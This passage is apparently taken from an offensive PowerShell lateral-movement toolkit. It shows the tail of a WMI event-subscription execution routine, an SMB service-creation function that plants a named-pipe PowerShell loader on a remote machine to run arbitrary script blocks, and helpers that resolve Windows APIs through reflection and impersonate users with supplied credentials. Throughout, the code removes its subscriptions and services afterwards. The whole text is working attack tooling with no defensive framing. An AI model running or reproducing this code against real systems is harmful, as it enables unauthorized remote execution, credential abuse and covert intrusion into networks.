            New-CimSession -ComputerName $ComputerName -Credential (New-Object Management.Automation.PSCredential("Guest",(New-Object Security.SecureString))) -SessionOption $cimOption -ErrorAction SilentlyContinue -Verbose:$false

            Write-Verbose "[CIMEXEC] Waiting for $Sleep seconds"
            Start-Sleep -Seconds $Sleep

            Write-Verbose "[CIMEXEC] Removing event subscription"
            $binding | Remove-CimInstance -Verbose:$false
            $consumer | Remove-CimInstance -Verbose:$false
            $filter | Remove-CimInstance -Verbose:$false
        }
        catch [Microsoft.Management.Infrastructure.CimException] {
            Write-Warning "[$ComputerName] Insufficient rights."
        }
        catch {
            Write-Warning "[$ComputerName] Execution failed. $_"
        }
    }
    END {
        Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
        Remove-CimSession -CimSession $cimSession
    }
}

function Local:Invoke-SmbService {
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateNotNullOrEmpty()]
        [String]
        $PipeName = [guid]::NewGuid().Guid,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServiceName = [guid]::NewGuid().Guid
    )

    BEGIN {
        if ($Credential.UserName) {
            $logonToken = Invoke-UserImpersonation -Credential $Credential
        }

        $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle
        $CloseServiceHandleDelegate = Get-DelegateType @([IntPtr]) ([Int])
        $CloseServiceHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)    

        $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA
        $OpenSCManagerADelegate = Get-DelegateType @([String], [String], [Int]) ([IntPtr])
        $OpenSCManagerA = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)

        $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA
        $OpenServiceADelegate = Get-DelegateType @([IntPtr], [String], [Int]) ([IntPtr])
        $OpenServiceA = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)
      
        $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA
        $CreateServiceADelegate = Get-DelegateType @([IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
        $CreateServiceA = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)

        $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA
        $StartServiceADelegate = Get-DelegateType @([IntPtr], [Int], [Int]) ([IntPtr])
        $StartServiceA = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)

        $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService
        $DeleteServiceDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
        $DeleteService = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)

        $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError
        $GetLastErrorDelegate = Get-DelegateType @() ([Int])
        $GetLastError = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)

        $loader = ''
        $loader += '$s = new-object IO.Pipes.NamedPipeServerStream(''' + $PipeName + ''', 3); '
        $loader += '$s.WaitForConnection(); '
        $loader += '$r = new-object IO.StreamReader $s; '
        $loader += '$x = ''''; '
        $loader += 'while (($y=$r.ReadLine()) -ne ''''){$x+=$y+[Environment]::NewLine}; '
        $loader += '$z = [ScriptBlock]::Create($x); '
        $loader += '& $z'
        $command = '%COMSPEC% /c start %COMSPEC% /c powershell -NoP -NonI -C "' + $loader + '"'
    }

    PROCESS {
        Write-Verbose "[SMBEXEC] Opening service manager"
        $managerHandle = $OpenSCManagerA.Invoke("\\$ComputerName", "ServicesActive", 0xF003F)
        if ((-not $managerHandle) -or ($managerHandle -eq 0)) {
            throw $GetLastError.Invoke()
        }

        Write-Verbose "[SMBEXEC] Creating new service: '$ServiceName'"
        $serviceHandle = $CreateServiceA.Invoke($managerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, $command, $null, $null, $null, $null, $null)
        if ((-not $serviceHandle) -or ($serviceHandle -eq 0)) {
            $err = $GetLastError.Invoke()
            Write-Warning "[SMBEXEC] CreateService failed, LastError: $err"
            break
        }
        $CloseServiceHandle.Invoke($serviceHandle) | Out-Null

        Write-Verbose "[SMBEXEC] Opening the service"
        $serviceHandle = $OpenServiceA.Invoke($managerHandle, $ServiceName, 0xF003F)
        if ((-not $serviceHandle) -or ($serviceHandle -eq 0)) {
            $err = $GetLastError.Invoke()
            Write-Warning "[SMBEXEC] OpenServiceA failed, LastError: $err"
        }

        Write-Verbose "[SMBEXEC] Starting the service"
        if ($StartServiceA.Invoke($serviceHandle, $null, $null) -eq 0){
            $err = $GetLastError.Invoke()
            if ($err -eq 1053) {
                Write-Verbose "[SMBEXEC] Command didn't respond to start"
            }
            else{
                Write-Warning "[SMBEXEC] StartService failed, LastError: $err"
            }
            Start-Sleep -Seconds 1
        }

        $script = ''
        $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
        $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $scriptBlock *>&1))' + [Environment]::NewLine
        $script += '$encOutput = [char[]]$output' + [Environment]::NewLine
        $script += '$writer = [IO.StreamWriter]::new($s)' + [Environment]::NewLine
        $script += '$writer.AutoFlush = $true' + [Environment]::NewLine
        $script += '$writer.WriteLine($encOutput)' + [Environment]::NewLine
        $script += '$writer.Dispose()' + [Environment]::NewLine
        $script += '$r.Dispose()' + [Environment]::NewLine
        $script += '$s.Dispose()' + [Environment]::NewLine
        $script = $script -creplace '(?m)^\s*\r?\n',''
        $in = [char[]] $script

        $pipeclient = New-Object IO.Pipes.NamedPipeClientStream($ComputerName, $PipeName, [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::None, [Security.Principal.TokenImpersonationLevel]::Impersonation)
        $pipeclient.Connect()
        $writer = New-Object  IO.StreamWriter($pipeclient)
        $writer.AutoFlush = $true
        $writer.WriteLine($in)
        $reader = new-object IO.StreamReader($pipeclient)
        $output = ''
        while (($data = $reader.ReadLine()) -ne $null) {
            $output += $data + [Environment]::NewLine
        }
        Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
    }

    END {
        $reader.Dispose()
        $pipeclient.Dispose()

        Write-Verbose "[SMBEXEC] Deleting the service"
        if ($DeleteService.invoke($serviceHandle) -eq 0){
            $err = $GetLastError.Invoke()
            Write-Warning "[SMBEXEC] DeleteService failed, LastError: $err"
        }
        $CloseServiceHandle.Invoke($serviceHandle) | Out-Null
        $CloseServiceHandle.Invoke($managerHandle) | Out-Null

        if ($logonToken) {
            Invoke-RevertToSelf -TokenHandle $logonToken
        }
    }
}

Function Local:Get-DelegateType {
    Param (
        [Type[]]
        $Parameters = (New-Object Type[](0)),

        [Type]
        $ReturnType = [Void]
    )
    $domain = [AppDomain]::CurrentDomain
    $dynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
    $assemblyBuilder = $domain.DefineDynamicAssembly($dynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $typeBuilder = $moduleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate])
    $constructorBuilder = $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [Reflection.CallingConventions]::Standard, $Parameters)
    $constructorBuilder.SetImplementationFlags('Runtime, Managed')
    $methodBuilder = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $methodBuilder.SetImplementationFlags('Runtime, Managed')
    Write-Output $typeBuilder.CreateType()
}

Function Local:Get-ProcAddress {
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        $Module,

        [Parameter(Mandatory = $True)]
        [String]
        $Procedure
    )
    $systemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $unsafeNativeMethods = $systemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $getModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')
    $getProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([Runtime.InteropServices.HandleRef], [String]))
    $kern32Handle = $getModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $handleRef = New-Object Runtime.InteropServices.HandleRef($tmpPtr, $kern32Handle)
    Write-Output $getProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$handleRef, $Procedure))
}

Function Local:Invoke-UserImpersonation {
    Param(
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )

    $logonUserAddr = Get-ProcAddress Advapi32.dll LogonUserA
    $logonUserDelegate = Get-DelegateType @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
    $logonUser = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($logonUserAddr, $logonUserDelegate)

    $impersonateLoggedOnUserAddr = Get-ProcAddress Advapi32.dll ImpersonateLoggedOnUser
    $impersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
    $impersonateLoggedOnUser = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($impersonateLoggedOnUserAddr, $impersonateLoggedOnUserDelegate)

    $logonTokenHandle = [IntPtr]::Zero
    $networkCredential = $Credential.GetNetworkCredential()
    $userDomain = $networkCredential.Domain
    $userName = $networkCredential.UserName

    if (-not $logonUser.Invoke($userName, $userDomain, $networkCredential.Password, 9, 3, [ref]$logonTokenHandle)) {
        $lastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "[UserImpersonation] LogonUser error: $(([ComponentModel.Win32Exception] $lastError).Message)"
    }

    if (-not $impersonateLoggedOnUser.Invoke($logonTokenHandle)) {
        throw "[UserImpersonation] ImpersonateLoggedOnUser error: $(([ComponentModel.Win32Exception] $lastError).Message)"
    }
    Write-Output $logonTokenHandle
}

Function Local:Invoke-RevertToSelf {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    $closeHandleAddr = Get-ProcAddress Kernel32.dll CloseHandle
    $closeHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
    $closeHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($closeHandleAddr, $closeHandleDelegate)

    $revertToSelfAddr = Get-ProcAddress Advapi32.dll RevertToSelf
    $revertToSelfDelegate = Get-DelegateType @() ([Bool])
    $revertToSelf = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($revertToSelfAddr, $revertToSelfDelegate)

    if ($PSBoundParameters['TokenHandle']) {
        $closeHandle.Invoke($TokenHandle) | Out-Null
    }
    if (-not $revertToSelf.Invoke()) {
        $lastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "[RevertToSelf] Error: $(([ComponentModel.Win32Exception] $lastError).Message)"
    }
}
